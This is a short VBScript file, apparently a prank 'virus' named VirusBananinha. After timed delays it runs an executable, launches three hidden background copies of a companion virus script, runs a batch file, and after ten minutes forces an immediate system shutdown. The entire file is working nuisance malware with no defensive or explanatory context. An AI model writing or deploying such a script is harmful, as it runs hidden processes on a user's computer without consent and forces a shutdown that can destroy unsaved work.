Set objShell = CreateObject("WScript.Shell")
Set shell = CreateObject("WScript.Shell")

WScript.Sleep 10000 

shell.Run "img.exe"

WScript.Sleep 20000 

objShell.Run "wscript.exe //B //Nologo Pasta-Bananinha\VirusBananinha-2.0.vbs " & i, 0, False
objShell.Run "wscript.exe //B //Nologo Pasta-Bananinha\VirusBananinha-2.0.vbs " & i, 0, False
objShell.Run "wscript.exe //B //Nologo Pasta-Bananinha\VirusBananinha-2.0.vbs " & i, 0, False

WScript.Sleep 10000 

shell.Run "Pasta-Bananinha\BananaCriadora.bat"

WScript.Sleep 600000
CreateObject("WScript.Shell").Run "shutdown -s -t 0"







